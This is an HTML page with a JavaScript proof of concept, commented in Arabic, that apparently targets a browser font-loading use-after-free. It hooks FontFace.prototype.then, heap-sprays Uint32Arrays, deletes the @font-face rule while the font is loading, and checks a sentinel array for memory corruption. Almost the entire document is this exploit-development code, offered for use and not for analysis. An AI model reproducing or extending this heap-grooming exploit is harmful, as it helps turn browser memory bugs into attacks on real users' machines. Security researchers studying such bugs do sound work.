<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color:red; font-family:monospace;">Status: Ready...</div>
    <script>
        const debug = document.getElementById('debug');
        const MAGIC = 0x41414141;
        // المصفوفة التي نراقبها
        let sentinel = new Uint32Array(1024).fill(MAGIC);

        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug.innerText = "Status: Hooked. Spraying Memory...";
                        
                        // التغيير هنا: استخدام Uint32Array بدلاً من FontFace
                        // هذا يحجز مساحة في الذاكرة بدون ثقل الـ CSS
                        let spray = [];
                        for(let i=0; i<100; i++) { 
                            // كل مصفوفة حجمها 0x1000 (4KB)
                            spray.push(new Uint32Array(0x1000).fill(0x42424242));
                        }
                        
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        // التحقق
                        let corrupted = false;
                        for(let i=0; i<sentinel.length; i++) {
                            if(sentinel[i] !== MAGIC) {
                                corrupted = true;
                                debug.innerText = "!! CRITICAL: Corruption Detected at index " + i + " Value: " + sentinel[i].toString(16);
                                break;
                            }
                        }
                        
                        if(!corrupted) {
                            debug.innerText = "Status: Grooming complete. No corruption.";
                        }
                    }
                    return undefined;
                }
            });

            document.fonts.load('1em x', 'AB');
        };
    </script>
</body>
</html>
